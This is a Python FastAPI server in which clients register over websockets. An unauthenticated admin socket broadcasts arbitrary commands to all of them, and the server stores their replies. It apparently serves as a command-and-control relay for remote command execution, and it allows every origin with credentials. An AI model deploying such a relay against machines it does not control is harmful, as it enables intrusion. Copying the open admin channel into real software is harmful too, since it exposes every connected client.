from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
import uvicorn
import os

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # In production, restrict this
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

clients = {}
outputs = {}

@app.get("/clients")
async def list_clients():
    return {"clients": list(clients.keys())}

@app.get("/outputs/{client_id}")
async def get_output(client_id: str):
    return {"output": outputs.get(client_id, "")}

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    await websocket.accept()
    clients[client_id] = websocket
    try:
        while True:
            msg = await websocket.receive_text()
            outputs[client_id] = msg
    except WebSocketDisconnect:
        clients.pop(client_id, None)
        outputs.pop(client_id, None)

@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    await websocket.accept()
    try:
        while True:
            cmd = await websocket.receive_text()
            for cid, ws in clients.items():
                await ws.send_text(cmd)
    except WebSocketDisconnect:
        pass

@app.get("/")
async def serve_index():
    with open("static/index.html") as f:
        html_content = f.read()
    return HTMLResponse(content=html_content, status_code=200)

app.mount("/static", StaticFiles(directory="static"), name="static")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run("main:app", host="0.0.0.0", port=port)
